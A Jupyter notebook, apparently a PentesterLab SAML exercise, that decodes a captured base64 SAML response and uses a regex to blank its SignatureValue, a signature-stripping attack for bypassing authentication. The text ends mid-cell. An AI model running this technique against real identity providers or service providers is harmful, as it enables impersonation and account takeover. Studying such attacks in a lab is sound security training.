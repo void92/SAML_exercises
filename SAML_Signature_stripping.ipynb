{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "49d05fca",
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64\n",
    "from bs4 import BeautifulSoup\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "c880911a",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Please enter SAML Response:  \n",
      "PHNhbWxwOlJlc3BvbnNlIElEPSJfZTBlY2NiZjAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyMy0wMi0xMFQxNTo0NTozM1oiIERlc3RpbmF0aW9uPSJodHRwOi8vcHRsLTg0NmI2NjBlLWVkOTZlZDAzLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfMjI3NzVlZDctYmYxOC00M2VkLTk0YmYtMmY3NjNjNjhmZTU1IiB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vaWRwLXB0bC04NDZiNjYwZS1lZDk2ZWQwMy5saWJjdXJsLnNvL3NhbWwvYXV0aDwvSXNzdWVyPjxzYW1scDpTdGF0dXM+PHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfZTBlY2NkYTAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIiBJc3N1ZUluc3RhbnQ9IjIwMjMtMDItMTBUMTU6NDU6MzNaIiBWZXJzaW9uPSIyLjAiPjxJc3N1ZXI+aHR0cDovL2lkcC1wdGwtODQ2YjY2MGUtZWQ5NmVkMDMubGliY3VybC5zby9zYW1sL2F1dGg8L0lzc3Vlcj48ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj48ZHM6U2lnbmVkSW5mbyB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6Q2Fub25pY2FsaXphdGlvbk1ldGhvZD48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiI+PC9kczpTaWduYXR1cmVNZXRob2Q+PGRzOlJlZmVyZW5jZSBVUkk9IiNfZTBlY2NkYTAtOGI4Ny0wMTNiLThiY2ItMDI0MmFjMTAwMDNmIj48ZHM6VHJhbnNmb3Jtcz48ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnI2VudmVsb3BlZC1zaWduYXR1cmUiPjwvZHM6VHJhbnNmb3JtPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiPjwvZHM6VHJhbnNmb3JtPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ij48L2RzOkRpZ2VzdE1ldGhvZD48ZHM6RGlnZXN0VmFsdWU+UmxmRXB2dlFlMk5ZcURJSHc5RmtycnlLVXJ3NVlJb1FuSUhUMWlNUjJtYz08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU+QU1wTCtyZUd0TXlLMFA2bHJuWFhkbFQ3V2lqcG9UQ1RWTkFBUTJRTUJjbi9pdGtFMkpiOHpCOS85Yzg3Y0xyUFJRcXdYTGRpL2dpY0lOeHpCRk1ka0RYMUtqWGxXNG9BSGY0T0o5VE1KVnE2dFkxWkx3dWVNencwVkkzb1VZeitQSVI5cEtzdGtKRG0zNjRWalpHYkxOZzFaTnhEbVBXK3UvVGh1RXczZnc1K2VSMVRnZ1VWS3M5OEJPVEV0b1dqZFlwU254T1VFbmlhaHpERHFHRmxNZCtUR0VuQUt2bThqTzBPRlJaaFduQWxGcnNSZE5oamxmbGZiMmhvVE41TnpxWklmMi9YOG9XTjVENCtuWXM0L0hBSDFLcXNGWm5FZDB5N1d3dnJQNW03OG1SUzN3VlB6dnhiQS9Ld3FYYk5hWjRPbnl2eVQ3YmNLdXVGSlVRMFhuSGpXMTV0OU1lLzN1N0RxcUpDdjY0cy96aWRzNEkxT2VVbDByOVhVbGlaaHEzbXg3d2ZrWFgwanRRb2JVVWRubnVCeXdaaDJGWnl0NzQ1czd6bGlBZzFycEZnR0FoeDlocHJOYWQ0cW9xaExsNkZGNU5zeE1RTmxrcXNMUEl5dlFtWUttMUNsbGNDVUZ5TzdZRERSMklpd3BrdTUyOVZ4djVzNDZPVXBjREkxSkZjeUpKNWgxaGdBMkdHSzdneDlzOHlEbUVPZ3BicWJzR3V3QzNtaTB5UllveG9MM1gzWHJ3b0h4eUVlOG9aNTkySzBweUpKVzJPM0RnR0k4dzRNMG5vVTQwSzVUd3dFSWhxVHFUQTV5TGZxdWJ3NkRQaENFb1llL3FYcDVrVzFNeGV2QkhMdUVGQVdNRmp6T2tBNHgrbVhnUDRVRTZid0hUREk1cnZjNGM9PC9kczpTaWduYXR1cmVWYWx1ZT48S2V5SW5mbyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI+PGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU+TUlJRk5qQ0NBeDRDQ1FET1ZsM0NyckN4MWpBTkJna3Foa2lHOXcwQkFRc0ZBREJkTVFzd0NRWURWUVFHRXdKQlZURVJNQThHQTFVRUNBd0lWbWxqZEc5eWFXRXhFakFRQmdOVkJBY01DVTFsYkdKdmRYSnVaVEVWTUJNR0ExVUVDZ3dNVUdWdWRHVnpkR1Z5VEdGaU1SQXdEZ1lEVlFRRERBZHpZVzFzWDJscE1CNFhEVEl3TURZd05EQXhORFEwTjFvWERUSXpNRE13TVRBeE5EUTBOMW93WFRFTE1Ba0dBMVVFQmhNQ1FWVXhFVEFQQmdOVkJBZ01DRlpwWTNSdmNtbGhNUkl3RUFZRFZRUUhEQWxOWld4aWIzVnlibVV4RlRBVEJnTlZCQW9NREZCbGJuUmxjM1JsY2t4aFlqRVFNQTRHQTFVRUF3d0hjMkZ0YkY5cGFUQ0NBaUl3RFFZSktvWklodmNOQVFFQkJRQURnZ0lQQURDQ0Fnb0NnZ0lCQUxmeW9iY2dYNE9OR1pPWUFSc01adEhFRncrRytSVEI4Qjd4UVRwdEwwRDZ2RGF2bWNLUUFsUnFFbkdkb05Sa0VOVk9kVElKYTVOOUp0cyt3clN5OWl0bGVHRmMyajMzdjhaK0M0dmF6Tk5IQzYxOG9iOEdZTS9aK0N1aWk1L1lzcklyS0xpZFZLYjg2SFFlaEhCUGk4NUtCcUFsQ3BJRUp3NEpzVTZBdEJhbmhnRGZSUVYvK04wckNDbjlrTk45ZDFTRHNEZ2pnclFnd1ZZVnBvN1FOTlFBcmtHWjkyUVhnWGE3cHkwZzZjbW11aERnUWRoN3Zaa0RVTjk2d1BoMzNMMjFWTVNpUStXL2lLSVBsc0kzckFHS0JjUzVES1BXYllsRXUzb2d1ZzNETHpXbGl4L29qbUtZOXAyaUVJaTVlQTV3Z2x2WkEvN1pZM0wxczdwV08zd0Z0VDBqM1JhYUNQMVhnYjFSUkRhaWlJSXcreTBWdDI3STFhK04reSs0ZWZXeWw0eDgrSHJQbHhoeVJvanZRWWhqbkNHemZ1SUpySVBnMkRhR3JWSDkrWUUxQ3UyZ3pXWmhJRTdMWEd1VEJJZmFWRUFML3U0ZGxwaVloWUx0NmhoNGFRbnpoRnNaOHp5QTZRS0Jhb3lGTndKaGtPY0FWY1dpY2dHVm0zMFpEKytKZlQzK1d1SjFUY01zZktXNnc3QzRVNFV3TTFNVzZpNmdBSnFBTk00dFc3YjF1Wm0zejI4dFRFQ2IzSG11RHFqYnRUaTRydkxGaE80MS9pdlpZOFYwYXZ1aGhvMEhXQnRNMjJKSG9wdEorQ0xmYURFdEhva1lydGZtTFVJaEJtb3pkc3dFTEFMR2VIK1dncWpmYXJyckRueDVRTGs1VERlcDJET1hVRjdOQWdNQkFBRXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnSUJBRjRxMlZPMm1pbUlRdklIdmRFUDFNc21iYlFDRjVGbDc4Yzh5V3F1cm9VeU8rQ2FRNkx6NmVTWXR2SEw3NEJBcnY4WG0vdDZ6RnBIT0tFVmV4OVpmZlpaTTBIRXBpOEcvaXhGZW5Udk1yMUg5TkRmKzlXRzEyRkZKT0o5M2I2NDRHMVd5bmtkclB0UThraVQ3V2RUYVJsQ0txQVpyb3p1ekNkZXhCRkpMN1FIMXlDRkFFVFVKL081VTFybDZaR1RxSDVWQTVEdEJpU0doaXJhaXFXYko4RU5hempzbVk1Zk1pMTlIbFlnOHBub3UxUzZ4WWFhaUtwTmRtZGJydDVpRlpOL2orUUtWS3QrNnU5ZWV5WWdxTTd6UDIwbDFDQTdNNUVqdUFpWGVLbElmQk81eFRpV0NvdSthM1VKbmNTTjNEVkFCVGJiL1FseVk3bFpoVVA3dG9BamFnMlAzbG0yMzdIbkczY1RVWlI2K2JRaUZLZ0s0bUlNTnRHWUo5U0ZOTjJIMjg3MnJUWG16N2l4MGlFK3lJL1lQR2RWNVJVRmEyQ3cxY0xxWjZYZ0J5b3lDZlh3MVh3QzlYS05FdGp3VzJReVgrQzRqSmpvSTVMeGhCOTVUT2EvVzQwRi9Ib08rL0ZyalhmdGZZVEhlRmk3NWh6OE95SWJhNU1sUnRFNEFPL2gzaWJ4OTFjM09IWXJtZ2hzbTUxclJ0SmoyL3h1WEc4MDhHY2lLY3QyRDVvWFZYQWxzMEtXemwycThpbDhaZ3VNYlJIeUt0ZTRFQmJCTjhxNlljRXpGSUdmSDdQd2FWNjdtN2pvNmJJQ2QyT0RPRkRFUzJZZUlFcnlaQ3ZYTGIzdmdTdC96Qm0vQTg0M0RiWWk1U1VKR1doQlE1WG4zTVI3aHl6L25MUnE8L2RzOlg1MDlDZXJ0aWZpY2F0ZT48L2RzOlg1MDlEYXRhPjwvS2V5SW5mbz48L2RzOlNpZ25hdHVyZT48U3ViamVjdD48TmFtZUlEIEZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm5hbWVpZC1mb3JtYXQ6cGVyc2lzdGVudCI+dXNlcjFAbGliY3VybC5zbzwvTmFtZUlEPjxTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+PFN1YmplY3RDb25maXJtYXRpb25EYXRhIEluUmVzcG9uc2VUbz0iXzIyNzc1ZWQ3LWJmMTgtNDNlZC05NGJmLTJmNzYzYzY4ZmU1NSIgTm90T25PckFmdGVyPSIyMDIzLTAyLTEwVDE1OjQ4OjMzWiIgUmVjaXBpZW50PSJodHRwOi8vcHRsLTg0NmI2NjBlLWVkOTZlZDAzLmxpYmN1cmwuc286ODAvc2FtbC9jb25zdW1lIj48L1N1YmplY3RDb25maXJtYXRpb25EYXRhPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q+PENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDIzLTAyLTEwVDE1OjQ1OjI4WiIgTm90T25PckFmdGVyPSIyMDIzLTAyLTEwVDE2OjQ1OjMzWiI+PEF1ZGllbmNlUmVzdHJpY3Rpb24+PEF1ZGllbmNlPmh0dHA6Ly9wdGwtODQ2YjY2MGUtZWQ5NmVkMDMubGliY3VybC5zbzo4MC9zYW1sL2F1dGg8L0F1ZGllbmNlPjwvQXVkaWVuY2VSZXN0cmljdGlvbj48L0NvbmRpdGlvbnM+PEF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyMy0wMi0xMFQxNTo0NTozM1oiIFNlc3Npb25JbmRleD0iX2UwZWNjZGEwLThiODctMDEzYi04YmNiLTAyNDJhYzEwMDAzZiI+PEF1dGhuQ29udGV4dD48QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmQ8L0F1dGhuQ29udGV4dENsYXNzUmVmPjwvQXV0aG5Db250ZXh0PjwvQXV0aG5TdGF0ZW1lbnQ+PC9Bc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=\n"
     ]
    }
   ],
   "source": [
    "SAML_resp = input(\"Please enter SAML Response:  \\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "e6ba18d4",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Please enter email address given in SAMLuser1@mail.com\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'user1'"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "SAML_resp1 = input(\"Please enter email address given in SAML\")\n",
    "SAML_resp2 = SAML_resp1.split('@')[0]\n",
    "SAML_resp2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "42c8201a",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<samlp:Response ID=\"_e0eccbf0-8b87-013b-8bcb-0242ac10003f\" Version=\"2.0\" IssueInstant=\"2023-02-10T15:45:33Z\" Destination=\"http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/consume\" Consent=\"urn:oasis:names:tc:SAML:2.0:consent:unspecified\" InResponseTo=\"_22775ed7-bf18-43ed-94bf-2f763c68fe55\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"><Issuer xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\">http://idp-ptl-846b660e-ed96ed03.libcurl.so/saml/auth</Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><Assertion xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_e0eccda0-8b87-013b-8bcb-0242ac10003f\" IssueInstant=\"2023-02-10T15:45:33Z\" Version=\"2.0\"><Issuer>http://idp-ptl-846b660e-ed96ed03.libcurl.so/saml/auth</Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:CanonicalizationMethod><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"></ds:SignatureMethod><ds:Reference URI=\"#_e0eccda0-8b87-013b-8bcb-0242ac10003f\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"></ds:Transform><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:Transform></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"></ds:DigestMethod><ds:DigestValue>RlfEpvvQe2NYqDIHw9FkrryKUrw5YIoQnIHT1iMR2mc=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>AMpL+reGtMyK0P6lrnXXdlT7WijpoTCTVNAAQ2QMBcn/itkE2Jb8zB9/9c87cLrPRQqwXLdi/gicINxzBFMdkDX1KjXlW4oAHf4OJ9TMJVq6tY1ZLwueMzw0VI3oUYz+PIR9pKstkJDm364VjZGbLNg1ZNxDmPW+u/ThuEw3fw5+eR1TggUVKs98BOTEtoWjdYpSnxOUEniahzDDqGFlMd+TGEnAKvm8jO0OFRZhWnAlFrsRdNhjlflfb2hoTN5NzqZIf2/X8oWN5D4+nYs4/HAH1KqsFZnEd0y7WwvrP5m78mRS3wVPzvxbA/KwqXbNaZ4OnyvyT7bcKuuFJUQ0XnHjW15t9Me/3u7DqqJCv64s/zids4I1OeUl0r9XUliZhq3mx7wfkXX0jtQobUUdnnuBywZh2FZyt745s7zliAg1rpFgGAhx9hprNad4qoqhLl6FF5NsxMQNlkqsLPIyvQmYKm1CllcCUFyO7YDDR2Iiwpku529Vxv5s46OUpcDI1JFcyJJ5h1hgA2GGK7gx9s8yDmEOgpbqbsGuwC3mi0yRYoxoL3X3XrwoHxyEe8oZ592K0pyJJW2O3DgGI8w4M0noU40K5TwwEIhqTqTA5yLfqubw6DPhCEoYe/qXp5kW1MxevBHLuEFAWMFjzOkA4x+mXgP4UE6bwHTDI5rvc4c=</ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><ds:X509Data><ds:X509Certificate>MIIFNjCCAx4CCQDOVl3CrrCx1jANBgkqhkiG9w0BAQsFADBdMQswCQYDVQQGEwJBVTERMA8GA1UECAwIVmljdG9yaWExEjAQBgNVBAcMCU1lbGJvdXJuZTEVMBMGA1UECgwMUGVudGVzdGVyTGFiMRAwDgYDVQQDDAdzYW1sX2lpMB4XDTIwMDYwNDAxNDQ0N1oXDTIzMDMwMTAxNDQ0N1owXTELMAkGA1UEBhMCQVUxETAPBgNVBAgMCFZpY3RvcmlhMRIwEAYDVQQHDAlNZWxib3VybmUxFTATBgNVBAoMDFBlbnRlc3RlckxhYjEQMA4GA1UEAwwHc2FtbF9paTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBALfyobcgX4ONGZOYARsMZtHEFw+G+RTB8B7xQTptL0D6vDavmcKQAlRqEnGdoNRkENVOdTIJa5N9Jts+wrSy9itleGFc2j33v8Z+C4vazNNHC618ob8GYM/Z+Cuii5/YsrIrKLidVKb86HQehHBPi85KBqAlCpIEJw4JsU6AtBanhgDfRQV/+N0rCCn9kNN9d1SDsDgjgrQgwVYVpo7QNNQArkGZ92QXgXa7py0g6cmmuhDgQdh7vZkDUN96wPh33L21VMSiQ+W/iKIPlsI3rAGKBcS5DKPWbYlEu3ogug3DLzWlix/ojmKY9p2iEIi5eA5wglvZA/7ZY3L1s7pWO3wFtT0j3RaaCP1Xgb1RRDaiiIIw+y0Vt27I1a+N+y+4efWyl4x8+HrPlxhyRojvQYhjnCGzfuIJrIPg2DaGrVH9+YE1Cu2gzWZhIE7LXGuTBIfaVEAL/u4dlpiYhYLt6hh4aQnzhFsZ8zyA6QKBaoyFNwJhkOcAVcWicgGVm30ZD++JfT3+WuJ1TcMsfKW6w7C4U4UwM1MW6i6gAJqANM4tW7b1uZm3z28tTECb3HmuDqjbtTi4rvLFhO41/ivZY8V0avuhho0HWBtM22JHoptJ+CLfaDEtHokYrtfmLUIhBmozdswELALGeH+WgqjfarrrDnx5QLk5TDep2DOXUF7NAgMBAAEwDQYJKoZIhvcNAQELBQADggIBAF4q2VO2mimIQvIHvdEP1MsmbbQCF5Fl78c8yWquroUyO+CaQ6Lz6eSYtvHL74BArv8Xm/t6zFpHOKEVex9ZffZZM0HEpi8G/ixFenTvMr1H9NDf+9WG12FFJOJ93b644G1WynkdrPtQ8kiT7WdTaRlCKqAZrozuzCdexBFJL7QH1yCFAETUJ/O5U1rl6ZGTqH5VA5DtBiSGhiraiqWbJ8ENazjsmY5fMi19HlYg8pnou1S6xYaaiKpNdmdbrt5iFZN/j+QKVKt+6u9eeyYgqM7zP20l1CA7M5EjuAiXeKlIfBO5xTiWCou+a3UJncSN3DVABTbb/QlyY7lZhUP7toAjag2P3lm237HnG3cTUZR6+bQiFKgK4mIMNtGYJ9SFNN2H2872rTXmz7ix0iE+yI/YPGdV5RUFa2Cw1cLqZ6XgByoyCfXw1XwC9XKNEtjwW2QyX+C4jJjoI5LxhB95TOa/W40F/HoO+/FrjXftfYTHeFi75hz8OyIba5MlRtE4AO/h3ibx91c3OHYrmghsm51rRtJj2/xuXG808GciKct2D5oXVXAls0KWzl2q8il8ZguMbRHyKte4EBbBN8q6YcEzFIGfH7PwaV67m7jo6bICd2ODOFDES2YeIEryZCvXLb3vgSt/zBm/A843DbYi5SUJGWhBQ5Xn3MR7hyz/nLRq</ds:X509Certificate></ds:X509Data></KeyInfo></ds:Signature><Subject><NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\">user1@libcurl.so</NameID><SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><SubjectConfirmationData InResponseTo=\"_22775ed7-bf18-43ed-94bf-2f763c68fe55\" NotOnOrAfter=\"2023-02-10T15:48:33Z\" Recipient=\"http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/consume\"></SubjectConfirmationData></SubjectConfirmation></Subject><Conditions NotBefore=\"2023-02-10T15:45:28Z\" NotOnOrAfter=\"2023-02-10T16:45:33Z\"><AudienceRestriction><Audience>http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/auth</Audience></AudienceRestriction></Conditions><AuthnStatement AuthnInstant=\"2023-02-10T15:45:33Z\" SessionIndex=\"_e0eccda0-8b87-013b-8bcb-0242ac10003f\"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion></samlp:Response>\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "'<samlp:Response ID=\"_e0eccbf0-8b87-013b-8bcb-0242ac10003f\" Version=\"2.0\" IssueInstant=\"2023-02-10T15:45:33Z\" Destination=\"http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/consume\" Consent=\"urn:oasis:names:tc:SAML:2.0:consent:unspecified\" InResponseTo=\"_22775ed7-bf18-43ed-94bf-2f763c68fe55\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"><Issuer xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\">http://idp-ptl-846b660e-ed96ed03.libcurl.so/saml/auth</Issuer><samlp:Status><samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/></samlp:Status><Assertion xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_e0eccda0-8b87-013b-8bcb-0242ac10003f\" IssueInstant=\"2023-02-10T15:45:33Z\" Version=\"2.0\"><Issuer>http://idp-ptl-846b660e-ed96ed03.libcurl.so/saml/auth</Issuer><ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:SignedInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"><ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:CanonicalizationMethod><ds:SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"></ds:SignatureMethod><ds:Reference URI=\"#_e0eccda0-8b87-013b-8bcb-0242ac10003f\"><ds:Transforms><ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"></ds:Transform><ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"></ds:Transform></ds:Transforms><ds:DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"></ds:DigestMethod><ds:DigestValue>RlfEpvvQe2NYqDIHw9FkrryKUrw5YIoQnIHT1iMR2mc=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue></ds:SignatureValue><KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><ds:X509Data><ds:X509Certificate>MIIFNjCCAx4CCQDOVl3CrrCx1jANBgkqhkiG9w0BAQsFADBdMQswCQYDVQQGEwJBVTERMA8GA1UECAwIVmljdG9yaWExEjAQBgNVBAcMCU1lbGJvdXJuZTEVMBMGA1UECgwMUGVudGVzdGVyTGFiMRAwDgYDVQQDDAdzYW1sX2lpMB4XDTIwMDYwNDAxNDQ0N1oXDTIzMDMwMTAxNDQ0N1owXTELMAkGA1UEBhMCQVUxETAPBgNVBAgMCFZpY3RvcmlhMRIwEAYDVQQHDAlNZWxib3VybmUxFTATBgNVBAoMDFBlbnRlc3RlckxhYjEQMA4GA1UEAwwHc2FtbF9paTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBALfyobcgX4ONGZOYARsMZtHEFw+G+RTB8B7xQTptL0D6vDavmcKQAlRqEnGdoNRkENVOdTIJa5N9Jts+wrSy9itleGFc2j33v8Z+C4vazNNHC618ob8GYM/Z+Cuii5/YsrIrKLidVKb86HQehHBPi85KBqAlCpIEJw4JsU6AtBanhgDfRQV/+N0rCCn9kNN9d1SDsDgjgrQgwVYVpo7QNNQArkGZ92QXgXa7py0g6cmmuhDgQdh7vZkDUN96wPh33L21VMSiQ+W/iKIPlsI3rAGKBcS5DKPWbYlEu3ogug3DLzWlix/ojmKY9p2iEIi5eA5wglvZA/7ZY3L1s7pWO3wFtT0j3RaaCP1Xgb1RRDaiiIIw+y0Vt27I1a+N+y+4efWyl4x8+HrPlxhyRojvQYhjnCGzfuIJrIPg2DaGrVH9+YE1Cu2gzWZhIE7LXGuTBIfaVEAL/u4dlpiYhYLt6hh4aQnzhFsZ8zyA6QKBaoyFNwJhkOcAVcWicgGVm30ZD++JfT3+WuJ1TcMsfKW6w7C4U4UwM1MW6i6gAJqANM4tW7b1uZm3z28tTECb3HmuDqjbtTi4rvLFhO41/ivZY8V0avuhho0HWBtM22JHoptJ+CLfaDEtHokYrtfmLUIhBmozdswELALGeH+WgqjfarrrDnx5QLk5TDep2DOXUF7NAgMBAAEwDQYJKoZIhvcNAQELBQADggIBAF4q2VO2mimIQvIHvdEP1MsmbbQCF5Fl78c8yWquroUyO+CaQ6Lz6eSYtvHL74BArv8Xm/t6zFpHOKEVex9ZffZZM0HEpi8G/ixFenTvMr1H9NDf+9WG12FFJOJ93b644G1WynkdrPtQ8kiT7WdTaRlCKqAZrozuzCdexBFJL7QH1yCFAETUJ/O5U1rl6ZGTqH5VA5DtBiSGhiraiqWbJ8ENazjsmY5fMi19HlYg8pnou1S6xYaaiKpNdmdbrt5iFZN/j+QKVKt+6u9eeyYgqM7zP20l1CA7M5EjuAiXeKlIfBO5xTiWCou+a3UJncSN3DVABTbb/QlyY7lZhUP7toAjag2P3lm237HnG3cTUZR6+bQiFKgK4mIMNtGYJ9SFNN2H2872rTXmz7ix0iE+yI/YPGdV5RUFa2Cw1cLqZ6XgByoyCfXw1XwC9XKNEtjwW2QyX+C4jJjoI5LxhB95TOa/W40F/HoO+/FrjXftfYTHeFi75hz8OyIba5MlRtE4AO/h3ibx91c3OHYrmghsm51rRtJj2/xuXG808GciKct2D5oXVXAls0KWzl2q8il8ZguMbRHyKte4EBbBN8q6YcEzFIGfH7PwaV67m7jo6bICd2ODOFDES2YeIEryZCvXLb3vgSt/zBm/A843DbYi5SUJGWhBQ5Xn3MR7hyz/nLRq</ds:X509Certificate></ds:X509Data></KeyInfo></ds:Signature><Subject><NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\">user1@libcurl.so</NameID><SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><SubjectConfirmationData InResponseTo=\"_22775ed7-bf18-43ed-94bf-2f763c68fe55\" NotOnOrAfter=\"2023-02-10T15:48:33Z\" Recipient=\"http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/consume\"></SubjectConfirmationData></SubjectConfirmation></Subject><Conditions NotBefore=\"2023-02-10T15:45:28Z\" NotOnOrAfter=\"2023-02-10T16:45:33Z\"><AudienceRestriction><Audience>http://ptl-846b660e-ed96ed03.libcurl.so:80/saml/auth</Audience></AudienceRestriction></Conditions><AuthnStatement AuthnInstant=\"2023-02-10T15:45:33Z\" SessionIndex=\"_e0eccda0-8b87-013b-8bcb-0242ac10003f\"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion></samlp:Response>'"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str1 = base64.b64decode(SAML_resp).decode()\n",
    "print(str1)\n",
    "str5 = re.sub('<ds:SignatureValue>.*<\\/ds:SignatureValue>', '<ds:SignatureValue></ds:SignatureValue>',str1)\n",
    "str5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "5ec06dc1",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
